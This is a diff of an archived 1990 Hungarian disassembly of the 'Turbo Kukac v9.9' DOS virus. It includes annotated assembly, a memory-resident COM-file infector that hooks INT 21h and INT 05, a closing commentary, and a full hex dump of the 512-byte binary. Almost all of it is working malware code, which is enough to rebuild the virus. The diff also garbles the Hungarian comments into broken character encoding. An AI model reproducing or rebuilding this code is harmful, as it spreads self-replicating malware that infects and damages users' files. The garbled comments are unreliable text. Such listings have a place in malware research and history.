@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      T
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ;****************************************************************************;
 ;                                                                            ;
 ;                     -=][][][][][][][][][][][][][][][=-                     ;
@@ -24,152 +35,152 @@
 TURBO KUKAC v9.9 virus unassembled list:
 								     `90.07.21.
 
-Magyar zat: K”v ri L szl¢
+Magyarï¿½zat: Kï¿½vï¿½ri Lï¿½szlï¿½
 	    Tel.: (41) 21-822	 07-13:20 mh.
 		       21-033	    18:00-
 
 
 
-28F8:0100 E80000	CALL	0103			;IP ‚rt‚ke az SI-be
-28F8:0103 90		NOP				;ez lesz a b zis offset
+28F8:0100 E80000	CALL	0103			;IP ï¿½rtï¿½ke az SI-be
+28F8:0103 90		NOP				;ez lesz a bï¿½zis offset
 28F8:0104 5E		POP	SI
 28F8:0105 50		PUSH	AX
 28F8:0106 51		PUSH	CX
 28F8:0107 B021		MOV	AL,21
 28F8:0109 B435		MOV	AH,35
-28F8:010B CD21		INT	21			;INT 21h c¡m‚nek lek‚r-
-							;dez‚se
+28F8:010B CD21		INT	21			;INT 21h cï¿½mï¿½nek lekï¿½r-
+							;dezï¿½se
 28F8:010D 8CC0		MOV	AX,ES
-28F8:010F 3D0040	CMP	AX,4000 		;a mem¢ri ban van ?
+28F8:010F 3D0040	CMP	AX,4000 		;a memï¿½riï¿½ban van ?
 28F8:0112 7224		JB	0138			;nincs!
-28F8:0114 83EE03	SUB	SI,+03			;b zis offset -3
+28F8:0114 83EE03	SUB	SI,+03			;bï¿½zis offset -3
 							;(3 byte hosszu a JMP
 							;+ az operandusa!)
 28F8:0117 BAC102	MOV	DX,02C1
-28F8:011A 81EA0001	SUB	DX,0100 		;0100h offset levon sa
-							;(COM file saj toss ga!)
+28F8:011A 81EA0001	SUB	DX,0100 		;0100h offset levonï¿½sa
+							;(COM file sajï¿½tossï¿½ga!)
 28F8:011E 03F2		ADD	SI,DX
-28F8:0120 8B1C		MOV	BX,[SI] 		;JMP k¢dja + az operan-
+28F8:0120 8B1C		MOV	BX,[SI] 		;JMP kï¿½dja + az operan-
 							;dus fele
 28F8:0122 8B4C02	MOV	CX,[SI+02]		;JMP operandusa + 1 byte
 28F8:0125 891E0001	MOV	[0100],BX		;eredeti prg kezdet
-28F8:0129 890E0201	MOV	[0102],CX		;let rol sa
+28F8:0129 890E0201	MOV	[0102],CX		;letï¿½rolï¿½sa
 28F8:012D 8CD8		MOV	AX,DS
 28F8:012F 8EC0		MOV	ES,AX			;ES=DS
 28F8:0131 59		POP	CX
 28F8:0132 58		POP	AX
-28F8:0133 BB0001	MOV	BX,0100 		;ugr s offset-je
-28F8:0136 FFE3		JMP	BX			;EREDETI PROGRAM VGRE-
-							;HAJTSA
+28F8:0133 BB0001	MOV	BX,0100 		;ugrï¿½s offset-je
+28F8:0136 FFE3		JMP	BX			;EREDETI PROGRAM Vï¿½GRE-
+							;HAJTï¿½SA
 
-			;HA MG NINCS A MEM¢RIBAN
-28F8:0138 8CD8		MOV	AX,DS			;saj t szegmense
-28F8:013A 48		DEC	AX			;saj t seg-1= MCB. seg.
+			;HA Mï¿½G NINCS A MEMï¿½RIï¿½BAN
+28F8:0138 8CD8		MOV	AX,DS			;sajï¿½t szegmense
+28F8:013A 48		DEC	AX			;sajï¿½t seg-1= MCB. seg.
 28F8:013B 8ED8		MOV	DS,AX			;DS=MCB. szegmense
-28F8:013D A10300	MOV	AX,[0003]		;DOS  lltal a programnak
-							;foglalt mem¢riablokk
+28F8:013D A10300	MOV	AX,[0003]		;DOS ï¿½lltal a programnak
+							;foglalt memï¿½riablokk
 							;hossza
-28F8:0140 2D4100	SUB	AX,0041 		;virus hossz t levonja
-							;bel”le (41*16 byte)
+28F8:0140 2D4100	SUB	AX,0041 		;virus hosszï¿½t levonja
+							;belï¿½le (41*16 byte)
 28F8:0143 A30300	MOV	[0003],AX		;visszateszi igy a DOS
-							; lltal l tott teljes
-							;mem¢ria nagys ga a prg.
-							;kil‚p‚se ut n (41*16
+							;ï¿½lltal lï¿½tott teljes
+							;memï¿½ria nagysï¿½ga a prg.
+							;kilï¿½pï¿½se utï¿½n (41*16
 							;byte-tal) kevesebb lesz
-							;Hasonl¢an csin lja ezt
+							;Hasonlï¿½an csinï¿½lja ezt
 							;a YANKEE DOODLE is, s
-							;ezzel azt ‚ri el, hogy
+							;ezzel azt ï¿½ri el, hogy
 							;semmilyen
 							;System Storage Map
 							;programmal nem mutat-
-							;hat¢ ki a virus jele-
-							;l‚te a mem¢ri ban!
+							;hatï¿½ ki a virus jele-
+							;lï¿½te a memï¿½riï¿½ban!
 							;A PCTOOLS system info
 							;kimutatja, azaz csak
-							;annyit l tni, hogy a
-							;fizikai RAM m‚ret 640K
-							;s a DOS  lltal l tott
-							;az 639k byte! Igy k”-
+							;annyit lï¿½tni, hogy a
+							;fizikai RAM mï¿½ret 640K
+							;s a DOS ï¿½lltal lï¿½tott
+							;az 639k byte! Igy kï¿½-
 							;vetkeztetni lehet...
 28F8:0146 8CC8		MOV	AX,CS
 28F8:0148 8ED8		MOV	DS,AX			;DS=CS
-28F8:014A A10200	MOV	AX,[0002]		;PSP-ben a RAM tetej‚-
-							;nek a paragrafusc¡me
+28F8:014A A10200	MOV	AX,[0002]		;PSP-ben a RAM tetejï¿½-
+							;nek a paragrafuscï¿½me
 28F8:014D 2D0008	SUB	AX,0800
-28F8:0150 8EC0		MOV	ES,AX			;virus £j szegmense
+28F8:0150 8EC0		MOV	ES,AX			;virus ï¿½j szegmense
 28F8:0152 BF0001	MOV	DI,0100
 28F8:0155 83EE03	SUB	SI,+03
 28F8:0158 B90002	MOV	CX,0200 		;virus hossza
 28F8:015B F3		REPZ
-28F8:015C A4		MOVSB				;virus m sol sa az £j
+28F8:015C A4		MOVSB				;virus mï¿½solï¿½sa az ï¿½j
 							;szegmensbe
-28F8:015D 8C06C702	MOV	[02C7],ES		;£j szegmens t rol sa
-28F8:0161 B96C01	MOV	CX,016C 		;bel‚p‚si pont
-28F8:0164 890EC502	MOV	[02C5],CX		;t rol sa
-28F8:0168 FF2EC502	JMP	FAR [02C5]		;ugr s az £j szegmens
-							;01c6 offset-‚re
-			;UJ SZEGMENSBEN A BELPSI PONT
+28F8:015D 8C06C702	MOV	[02C7],ES		;ï¿½j szegmens tï¿½rolï¿½sa
+28F8:0161 B96C01	MOV	CX,016C 		;belï¿½pï¿½si pont
+28F8:0164 890EC502	MOV	[02C5],CX		;tï¿½rolï¿½sa
+28F8:0168 FF2EC502	JMP	FAR [02C5]		;ugrï¿½s az ï¿½j szegmens
+							;01c6 offset-ï¿½re
+			;UJ SZEGMENSBEN A BELï¿½Pï¿½SI PONT
 28F8:016C 8CC1		MOV	CX,ES
-28F8:016E 8CD8		MOV	AX,DS			;ahonnan m solta mag t
+28F8:016E 8CD8		MOV	AX,DS			;ahonnan mï¿½solta magï¿½t
 28F8:0170 26		ES:
-28F8:0171 A3CB02	MOV	[02CB],AX		;RGI PRG. segment c¡m
+28F8:0171 A3CB02	MOV	[02CB],AX		;Rï¿½GI PRG. segment cï¿½m
 28F8:0174 B80001	MOV	AX,0100
 28F8:0177 26		ES:
-28F8:0178 A3C902	MOV	[02C9],AX		;0100h offset t rol sa
+28F8:0178 A3C902	MOV	[02C9],AX		;0100h offset tï¿½rolï¿½sa
 28F8:017B 8CC0		MOV	AX,ES
 28F8:017D 8ED8		MOV	DS,AX
-28F8:017F BAC701	MOV	DX,01C7 		;INT 05 - HARD COPY £j
+28F8:017F BAC701	MOV	DX,01C7 		;INT 05 - HARD COPY ï¿½j
 							;offset-je
 28F8:0182 B005		MOV	AL,05
 28F8:0184 B425		MOV	AH,25
-28F8:0186 CD21		INT	21			;INT 05 ellop sa
+28F8:0186 CD21		INT	21			;INT 05 ellopï¿½sa
 28F8:0188 B435		MOV	AH,35
 28F8:018A B021		MOV	AL,21
-28F8:018C CD21		INT	21			;INT 21h c¡m lek‚rdez‚-
+28F8:018C CD21		INT	21			;INT 21h cï¿½m lekï¿½rdezï¿½-
 							;se
 28F8:018E 2E		CS:
-28F8:018F 891EB702	MOV	[02B7],BX		;INT 05h offset (r‚gi)
+28F8:018F 891EB702	MOV	[02B7],BX		;INT 05h offset (rï¿½gi)
 28F8:0193 8CC3		MOV	BX,ES
 28F8:0195 2E		CS:
-28F8:0196 891EB902	MOV	[02B9],BX		;INT 05h segment (r‚gi)
-28F8:019A B8D901	MOV	AX,01D9 		;£j INT 21h offset c¡m
+28F8:0196 891EB902	MOV	[02B9],BX		;INT 05h segment (rï¿½gi)
+28F8:019A B8D901	MOV	AX,01D9 		;ï¿½j INT 21h offset cï¿½m
 28F8:019D 8BD0		MOV	DX,AX
 28F8:019F 8BC1		MOV	AX,CX
 28F8:01A1 8ED8		MOV	DS,AX
 28F8:01A3 B021		MOV	AL,21
 28F8:01A5 B425		MOV	AH,25
-28F8:01A7 CD21		INT	21			;INT 21h ellop sa
+28F8:01A7 CD21		INT	21			;INT 21h ellopï¿½sa
 28F8:01A9 8B16C102	MOV	DX,[02C1]		;EREDETI JMP + AZ
 28F8:01AD 8B0EC302	MOV	CX,[02C3]		;OPERANDUSA!!!
 28F8:01B1 A1CB02	MOV	AX,[02CB]		;EREDETI PRG. SEG!!!
 28F8:01B4 8ED8		MOV	DS,AX
-28F8:01B6 89160001	MOV	[0100],DX		;eredeti JMP k¢dja
-28F8:01BA 890E0201	MOV	[0102],CX		;‚s operandusa
+28F8:01B6 89160001	MOV	[0100],DX		;eredeti JMP kï¿½dja
+28F8:01BA 890E0201	MOV	[0102],CX		;ï¿½s operandusa
 28F8:01BE 8EC0		MOV	ES,AX
 28F8:01C0 59		POP	CX
 28F8:01C1 58		POP	AX
 28F8:01C2 2E		CS:
 28F8:01C3 FF2EC902	JMP	FAR [02C9]		;EREDETI PROGRAM FUTTA-
-							;TSA!
-			;£j INT 05 - HARD COPY rutin
+							;Tï¿½SA!
+			;ï¿½j INT 05 - HARD COPY rutin
 28F8:01C7 90		NOP
 28F8:01C8 50		PUSH	AX
 28F8:01C9 1E		PUSH	DS
 28F8:01CA 52		PUSH	DX
 28F8:01CB 8CC8		MOV	AX,CS
 28F8:01CD 8ED8		MOV	DS,AX
-			;VGTELEN CIKLUS!
-28F8:01CF BACE02	MOV	DX,02CE 		;sz”veg kezdete
+			;Vï¿½GTELEN CIKLUS!
+28F8:01CF BACE02	MOV	DX,02CE 		;szï¿½veg kezdete
 							;Turbo Kukac v9.9
 28F8:01D2 B409		MOV	AH,09			;print string
-28F8:01D4 E8D900	CALL	02B0			;r‚gi INT 21h hiv sa
-28F8:01D7 EBF6		JMP	01CF			;£jra!
+28F8:01D4 E8D900	CALL	02B0			;rï¿½gi INT 21h hivï¿½sa
+28F8:01D7 EBF6		JMP	01CF			;ï¿½jra!
 
-			;£j INT 21h rutin
+			;ï¿½j INT 21h rutin
 28F8:01D9 90		NOP
-28F8:01DA 80FC3D	CMP	AH,3D			;file nyit sa alfunkci¢?
+28F8:01DA 80FC3D	CMP	AH,3D			;file nyitï¿½sa alfunkciï¿½?
 28F8:01DD 7403		JZ	01E2			;igen
-28F8:01DF E9C700	JMP	02A9			;nem ugr sa az eredeti
+28F8:01DF E9C700	JMP	02A9			;nem ugrï¿½sa az eredeti
 							;INT 21h-ra
 28F8:01E2 90		NOP
 28F8:01E3 1E		PUSH	DS
@@ -181,88 +192,88 @@ Magyar zat: K”v ri L szl¢
 28F8:01E9 57		PUSH	DI
 28F8:01EA 56		PUSH	SI
 
-			;File kiterjeszt‚s ellen”rz‚se
+			;File kiterjesztï¿½s ellenï¿½rzï¿½se
 
 28F8:01EB 8BFA		MOV	DI,DX			;file PATH kezdete
 28F8:01ED 8CDE		MOV	SI,DS
 28F8:01EF 8EC6		MOV	ES,SI			;ES=DS (igy a file PATH
-							; tv‚tele!)
-28F8:01F1 B000		MOV	AL,00			;PATH lez r¢ nulla
-28F8:01F3 B93200	MOV	CX,0032 		;file secifik ci¢ hossza
-28F8:01F6 FC		CLD				;el”re
+							;ï¿½tvï¿½tele!)
+28F8:01F1 B000		MOV	AL,00			;PATH lezï¿½rï¿½ nulla
+28F8:01F3 B93200	MOV	CX,0032 		;file secifikï¿½ciï¿½ hossza
+28F8:01F6 FC		CLD				;elï¿½re
 28F8:01F7 F2		REPNZ
-28F8:01F8 AE		SCASB				;PATH lez r¢ 0 byte ke-
-							;res‚se
-28F8:01F9 83EF03	SUB	DI,+03			;-3 igy a kiterjeszt‚s
-							;kezdet+1 pozici¢ra mu-
+28F8:01F8 AE		SCASB				;PATH lezï¿½rï¿½ 0 byte ke-
+							;resï¿½se
+28F8:01F9 83EF03	SUB	DI,+03			;-3 igy a kiterjesztï¿½s
+							;kezdet+1 poziciï¿½ra mu-
 							;tat
 28F8:01FC B84F4D	MOV	AX,4D4F 		;'OM' AX-be
 28F8:01FF 26		ES:
-28F8:0200 3B05		CMP	AX,[DI] 		; 'OM' a v‚ge ?
-28F8:0202 7403		JZ	0207			;igen val szinleg COM
+28F8:0200 3B05		CMP	AX,[DI] 		; 'OM' a vï¿½ge ?
+28F8:0202 7403		JZ	0207			;igen valï¿½szinï¿½leg COM
 							;file
-28F8:0204 E99A00	JMP	02A1			;nem COM ugr s az erede-
+28F8:0204 E99A00	JMP	02A1			;nem COM ugrï¿½s az erede-
 							;ti INT 21h-ra
 28F8:0207 B82E43	MOV	AX,432E 		;'.C' AX-be
 28F8:020A 26		ES:
 28F8:020B 3B45FE	CMP	AX,[DI-02]		; '.C' ?
 28F8:020E 7403		JZ	0213			;biztos hogy COM file!
-28F8:0210 E98E00	JMP	02A1			;nem COM ugr s az erede-
+28F8:0210 E98E00	JMP	02A1			;nem COM ugrï¿½s az erede-
 							;ti INT 21h-ra
-			;File nyit sa
+			;File nyitï¿½sa
 
-28F8:0213 B43D		MOV	AH,3D			;file nyit s
-28F8:0215 B002		MOV	AL,02			;¡r s/olvas s
-28F8:0217 E89600	CALL	02B0			;INT 21h hiv sa
+28F8:0213 B43D		MOV	AH,3D			;file nyitï¿½s
+28F8:0215 B002		MOV	AL,02			;ï¿½rï¿½s/olvasï¿½s
+28F8:0217 E89600	CALL	02B0			;INT 21h hivï¿½sa
 28F8:021A 7303		JNB	021F			;ha nincs hiba
-28F8:021C E98200	JMP	02A1			;hiba eset‚n ugr s az
+28F8:021C E98200	JMP	02A1			;hiba esetï¿½n ugrï¿½s az
 							;eredeti INT 21h-ra
-28F8:021F 8BD8		MOV	BX,AX			;file kezel”
+28F8:021F 8BD8		MOV	BX,AX			;file kezelï¿½
 
-			;File m‚ret ellen”rz‚s
+			;File mï¿½ret ellenï¿½rzï¿½s
 
 28F8:0221 B90000	MOV	CX,0000
 28F8:0224 BA0000	MOV	DX,0000
-28F8:0227 B002		MOV	AL,02			;file v‚g‚re
-28F8:0229 B442		MOV	AH,42			;file pointer mozgat sa
-28F8:022B E88200	CALL	02B0			;INT 21h hiv sa
+28F8:0227 B002		MOV	AL,02			;file vï¿½gï¿½re
+28F8:0229 B442		MOV	AH,42			;file pointer mozgatï¿½sa
+28F8:022B E88200	CALL	02B0			;INT 21h hivï¿½sa
 28F8:022E 3D00FE	CMP	AX,FE00
 28F8:0231 736E		JNB	02A1			;ha nem nagyobb a file
-							;65024 byte-n l
+							;65024 byte-nï¿½l
 28F8:0233 2D0300	SUB	AX,0003 		;JMP+op hossza
 
-			;Fert”zend” file eredeti 4 byte j nak
-			;beolvas sa
+			;Fertï¿½zendï¿½ file eredeti 4 byte jï¿½nak
+			;beolvasï¿½sa
 
 28F8:0236 2E		CS:
-28F8:0237 A3BE02	MOV	[02BE],AX		;let rolja
-28F8:023A B442		MOV	AH,42			;file pointer mozgat sa
-28F8:023C B000		MOV	AL,00			;file elej‚re
+28F8:0237 A3BE02	MOV	[02BE],AX		;letï¿½rolja
+28F8:023A B442		MOV	AH,42			;file pointer mozgatï¿½sa
+28F8:023C B000		MOV	AL,00			;file elejï¿½re
 28F8:023E B90000	MOV	CX,0000
 28F8:0241 BA0000	MOV	DX,0000
-28F8:0244 E86900	CALL	02B0			;INT 21h hiv sa
-28F8:0247 B43F		MOV	AH,3F			;olvas s file-b¢l
+28F8:0244 E86900	CALL	02B0			;INT 21h hivï¿½sa
+28F8:0247 B43F		MOV	AH,3F			;olvasï¿½s file-bï¿½l
 28F8:0249 B90400	MOV	CX,0004 		;4 byte
 28F8:024C BAC102	MOV	DX,02C1 		;ide tegye
 28F8:024F 8CCF		MOV	DI,CS
 28F8:0251 8EDF		MOV	DS,DI			;DS=CS
-28F8:0253 E85A00	CALL	02B0			;INT 21h hiv sa
+28F8:0253 E85A00	CALL	02B0			;INT 21h hivï¿½sa
 28F8:0256 B005		MOV	AL,05
-28F8:0258 3A06C402	CMP	AL,[02C4]		;utols¢ byte=5 ?
-28F8:025C 7443		JZ	02A1			;igen, ugr s az eredeti
+28F8:0258 3A06C402	CMP	AL,[02C4]		;utolsï¿½ byte=5 ?
+28F8:025C 7443		JZ	02A1			;igen, ugrï¿½s az eredeti
 							;INT 21h -ra
 
-			;Fert”zend” file-ba a virusra
-			;mutat¢ JMP+op. ki¡r sa (4 byte)
+			;Fertï¿½zendï¿½ file-ba a virusra
+			;mutatï¿½ JMP+op. kiï¿½rï¿½sa (4 byte)
 
-28F8:025E B442		MOV	AH,42			;file pointer mozgat sa
-28F8:0260 B000		MOV	AL,00			;file elej‚re
+28F8:025E B442		MOV	AH,42			;file pointer mozgatï¿½sa
+28F8:0260 B000		MOV	AL,00			;file elejï¿½re
 28F8:0262 B90000	MOV	CX,0000
 28F8:0265 8BD1		MOV	DX,CX
-28F8:0267 E84600	CALL	02B0			;INT 21h hiv sa
-28F8:026A B0E9		MOV	AL,E9			;JMP k¢dja
+28F8:0267 E84600	CALL	02B0			;INT 21h hivï¿½sa
+28F8:026A B0E9		MOV	AL,E9			;JMP kï¿½dja
 28F8:026C 2E		CS:
-28F8:026D A2BD02	MOV	[02BD],AL		;let rolja
+28F8:026D A2BD02	MOV	[02BD],AL		;letï¿½rolja
 28F8:0270 B005		MOV	AL,05
 28F8:0272 2E		CS:
 28F8:0273 A2C002	MOV	[02C0],AL
@@ -270,23 +281,23 @@ Magyar zat: K”v ri L szl¢
 28F8:0279 BABD02	MOV	DX,02BD 		;JMP + op. kezdete
 28F8:027C 8CC8		MOV	AX,CS
 28F8:027E 8ED8		MOV	DS,AX
-28F8:0280 B440		MOV	AH,40			;ki¡r s file-ba
-28F8:0282 E82B00	CALL	02B0			;INT 21h hiv sa
+28F8:0280 B440		MOV	AH,40			;kiï¿½rï¿½s file-ba
+28F8:0282 E82B00	CALL	02B0			;INT 21h hivï¿½sa
 
-			;Program megfert”z‚se 0200h byte ki¡r sa
-			;azaz a virus m”g‚m sol sa
+			;Program megfertï¿½zï¿½se 0200h byte kiï¿½rï¿½sa
+			;azaz a virus mï¿½gï¿½mï¿½solï¿½sa
 
-28F8:0285 B442		MOV	AH,42			;file pointer mozgat sa
-28F8:0287 B002		MOV	AL,02			;file v‚g‚re
+28F8:0285 B442		MOV	AH,42			;file pointer mozgatï¿½sa
+28F8:0287 B002		MOV	AL,02			;file vï¿½gï¿½re
 28F8:0289 B90000	MOV	CX,0000
 28F8:028C 8BD1		MOV	DX,CX
-28F8:028E E81F00	CALL	02B0			;INT 21h hiv sa
-28F8:0291 BA0001	MOV	DX,0100 		;0100h ofset-t”l
+28F8:028E E81F00	CALL	02B0			;INT 21h hivï¿½sa
+28F8:0291 BA0001	MOV	DX,0100 		;0100h ofset-tï¿½l
 28F8:0294 B90002	MOV	CX,0200 		;0200h byte virus hossza
-28F8:0297 B440		MOV	AH,40			;ki¡r s file-ba
-28F8:0299 E81400	CALL	02B0			;INT 21h hiv sa
-28F8:029C B43E		MOV	AH,3E			;file z r sa
-28F8:029E E80F00	CALL	02B0			;INT 21h hiv sa
+28F8:0297 B440		MOV	AH,40			;kiï¿½rï¿½s file-ba
+28F8:0299 E81400	CALL	02B0			;INT 21h hivï¿½sa
+28F8:029C B43E		MOV	AH,3E			;file zï¿½rï¿½sa
+28F8:029E E80F00	CALL	02B0			;INT 21h hivï¿½sa
 28F8:02A1 5E		POP	SI
 28F8:02A2 5F		POP	DI
 28F8:02A3 5A		POP	DX
@@ -300,11 +311,11 @@ Magyar zat: K”v ri L szl¢
 28F8:02AA 2E		CS:
 28F8:02AB FF2EB702	JMP	FAR [02B7]		;eredeti INT 21h-ra
 28F8:02AF CF		IRET
-			;Eredeti INT 21h hiv sa
+			;Eredeti INT 21h hivï¿½sa
 28F8:02B0 9C		PUSHF				;elmenti mivel az IRET
 							;visszamenti a flag-eket
 28F8:02B1 2E		CS:
-28F8:02B2 FF1EB702	CALL	FAR [02B7]		;eredeti INT 21h hiv sa
+28F8:02B2 FF1EB702	CALL	FAR [02B7]		;eredeti INT 21h hivï¿½sa
 28F8:02B6 C3		RET
 
 28F8:02B7 16		PUSH	SS
@@ -340,24 +351,24 @@ Magyar zat: K”v ri L szl¢
 28F8:02FE FA		CLI
 28F8:02FF 00C7		ADD	BH,AL
 
-Megjegyz‚s:
+Megjegyzï¿½s:
 
-	Nagyon primit¡v virus, de megvan a maga zsenialit sa, k‚t legyet
-	t egy csap sra, pl COPY parancs eset‚n megnyit egy com file-t,s
-	ha a virus a mem¢ri ban van, akkor m‚g a m soland¢ file-t megfer-
-	t”zi, s a COPY m r a fert”z”tt file-t m solja! Nem igaz n k r-
-	t‚kony v¡rus, puszt n mindentt ott akar lenni, s nehez¡teni a
-	felhaszn l¢(k) munk j t! M‚rete nagyon kicsi, mind”ssze 512 byte!
-	Hi nyoznak a v¡rusb¢l az (tapasztalataim szerint) eddigi virusok-
-	ban fellelhet” ellen”rz‚sek, gondolok itt arra, hogy ha megt”rt‚nik
-	egy file-ba (hoz) val¢ ki¡r s nem ellen”rzi a program hogy val¢ban
-	ki¡rta-e azt az X byte-ot. Tov bb  mikor rezidess‚ (nem {hivatalo-
-	san} bejegyzetten) teszi mag t nem m¢dos¡tja az MCB. 13. byte-j n
-	l‚v” RAM tetej‚nek a paragrafus c¡m‚tt a saj t maga  lltal lefog-
-	lalt m‚rettel (kivon s!), mint PL. a Yankee Doodle! A Yankee m‚g
-	azt is megn‚zi, hogy amit meg akar fert”zni az az utols¢ mem¢.
-	blokkban van-e, b r abban kell lennie, mert a DOS egy programnak
-	odaadja a teljes szabad mem¢ri t, ami van...
+	Nagyon primitï¿½v virus, de megvan a maga zsenialitï¿½sa, kï¿½t legyet
+	ï¿½t egy csapï¿½sra, pl COPY parancs esetï¿½n megnyit egy com file-t,s
+	ha a virus a memï¿½riï¿½ban van, akkor mï¿½g a mï¿½solandï¿½ file-t megfer-
+	tï¿½zi, s a COPY mï¿½r a fertï¿½zï¿½tt file-t mï¿½solja! Nem igazï¿½n kï¿½r-
+	tï¿½kony vï¿½rus, pusztï¿½n mindenï¿½tt ott akar lenni, s nehezï¿½teni a
+	felhasznï¿½lï¿½(k) munkï¿½jï¿½t! Mï¿½rete nagyon kicsi, mindï¿½ssze 512 byte!
+	Hiï¿½nyoznak a vï¿½rusbï¿½l az (tapasztalataim szerint) eddigi virusok-
+	ban fellelhetï¿½ ellenï¿½rzï¿½sek, gondolok itt arra, hogy ha megtï¿½rtï¿½nik
+	egy file-ba (hoz) valï¿½ kiï¿½rï¿½s nem ellenï¿½rzi a program hogy valï¿½ban
+	kiï¿½rta-e azt az X byte-ot. Tovï¿½bbï¿½ mikor rezidessï¿½ (nem {hivatalo-
+	san} bejegyzetten) teszi magï¿½t nem mï¿½dosï¿½tja az MCB. 13. byte-jï¿½n
+	lï¿½vï¿½ RAM tetejï¿½nek a paragrafus cï¿½mï¿½tt a sajï¿½t maga ï¿½lltal lefog-
+	lalt mï¿½rettel (kivonï¿½s!), mint PL. a Yankee Doodle! A Yankee mï¿½g
+	azt is megnï¿½zi, hogy amit meg akar fertï¿½zni az az utolsï¿½ memï¿½.
+	blokkban van-e, bï¿½r abban kell lennie, mert a DOS egy programnak
+	odaadja a teljes szabad memï¿½riï¿½t, ami van...
 
 
 DUMP:
@@ -392,7 +403,7 @@ DUMP:
 28F8:02B0  9C 2E FF 1E B7 02 C3 16-13 0C 02 02 00 E9 06 06   ................
 28F8:02C0  05 E9 06 04 05 01 00 00-00 00 01 F0 09 01	     ..............
 
-	   ;Ki¡rand¢ sz”veg kezdete
+	   ;Kiï¿½randï¿½ szï¿½veg kezdete
 28F8:02C0					     54 75		   Tu
 28F8:02D0  72 62 6F 20 4B 75 6B 61-63 20 39 2E 39 20 20 20   rbo Kukac 9.9
 28F8:02E0  20 20 20 24						$
